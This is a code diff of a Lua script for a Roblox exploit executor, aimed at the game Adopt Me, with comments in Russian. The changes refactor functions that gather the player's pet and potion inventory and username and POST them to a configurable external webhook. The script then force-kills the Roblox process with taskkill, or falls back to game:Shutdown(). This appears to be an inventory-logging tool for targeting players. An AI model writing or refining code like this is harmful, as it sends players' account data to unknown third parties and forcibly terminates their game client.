@@ -8,14 +8,27 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 
+-- Единая функция для получения http-запросов
+local function getHTTP()
+    return (syn and syn.request) or (http and http.request) or http_request or fluxus and fluxus.request or request
+end
+
+local httprequest = getHTTP()
+
 local function sendWebhook(username, content, type)
     if not username or not content or not type then
-        warn("Invalid parameters for sendWebhook: username, content, and type must be provided")
+        warn("Invalid parameters for sendWebhook")
         return
     end
 
     if not getgenv().WebHookURL or not HttpService then
-        warn("Webhook URL or HttpService not available")
+        warn("Webhook configuration error")
+        return
+    end
+
+    -- Проверка доступности httprequest
+    if not httprequest then
+        warn("HTTP request function not available")
         return
     end
 
@@ -28,26 +41,28 @@ local function sendWebhook(username, content, type)
 
     local success, encoded = pcall(HttpService.JSONEncode, HttpService, data)
     if not success then
-        warn("Failed to encode JSON: " .. tostring(encoded))
+        warn("JSON encode failed: " .. tostring(encoded))
         return
     end
 
-    local success, response = pcall(httprequest, {
+    local result
+    success, result = pcall(httprequest, {
         Url = getgenv().WebHookURL,
         Body = encoded,
         Method = "POST",
         Headers = {
-            ["Content-Type"] = "application/json",
-            ["User-Agent"] = "RobloxClient"
+            ["Content-Type"] = "application/json"
         }
     })
 
-    if success and response.Success then
-        print("Webhook sent successfully for user: " .. username)
+    if success then
+        if result.Success then
+            print("Webhook delivered to " .. username)
+        else
+            warn("Webhook failed. Status: " .. (result.StatusCode or "No status"))
+        end
     else
-        local status = response and response.StatusCode or "Unknown"
-        sendWebhook(LocalPlayer.Name, tostring(status), "error")
-        warn("Failed to send webhook. Status: " .. tostring(status))
+        warn("HTTP request failed: " .. tostring(result))
     end
 end
 
@@ -102,9 +117,11 @@ local function countPotions()
     return flyPotions, ridePotions
 end
 
-local function sendhook()
-    local httprequest = (syn and syn.request) or (http and http.request) or http_request or request
-    if not httprequest or not getgenv().WebHookURL then return end
+local function sendInventoryReport()
+    if not httprequest or not getgenv().WebHookURL then 
+        warn("HTTP components missing")
+        return 
+    end
 
     local pets, totalPets = collectPetInfo()
     local flyPotions, ridePotions = countPotions()
@@ -117,9 +134,16 @@ local function sendhook()
     
     local petLines = {}
     for _, pet in pairs(pets) do
-        local flyStatus = pet.flyable and "F" or ""
-        local rideStatus = pet.rideable and "R" or ""
-        table.insert(petLines, pet.name.." ("..pet.rarity..(flyStatus ~= "" or rideStatus ~= "" and ", " or "")..flyStatus..(flyStatus ~= "" and rideStatus ~= "" and ", " or "")..rideStatus..")")
+        local traits = {}
+        if pet.flyable then table.insert(traits, "F") end
+        if pet.rideable then table.insert(traits, "R") end
+        
+        local traitStr = ""
+        if #traits > 0 then
+            traitStr = " ("..table.concat(traits, ", ")..")"
+        end
+        
+        table.insert(petLines, pet.name..traitStr)
     end
     
     if #petLines > 0 then
@@ -128,26 +152,12 @@ local function sendhook()
         message = message.."Нет особых питомцев"
     end
 
-    local payload = {
-        username = LocalPlayer.Name,
-        content = message,
-        type = 'Inventory',
-        game = 'Adopt Me'
-    }
-
-    httprequest({
-        Url = getgenv().WebHookURL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
+    sendWebhook(LocalPlayer.Name, message, 'Inventory')
 end
 
-sendhook()
+sendInventoryReport()
 
-sendWebhook(LocalPlayer.Name, "lefted", 'left')
+-- Убрана отправка "lefted" так как игрок еще не вышел
 
 if identifyexecutor and identifyexecutor():find("Windows") then
     local success = pcall(function()
@@ -155,6 +165,6 @@ if identifyexecutor and identifyexecutor():find("Windows") then
         os.execute("taskkill /pid "..processId.." /f")
     end)
     if not success then
-        while true do end 
+        game:Shutdown() -- Более надежный способ выхода
     end
 end
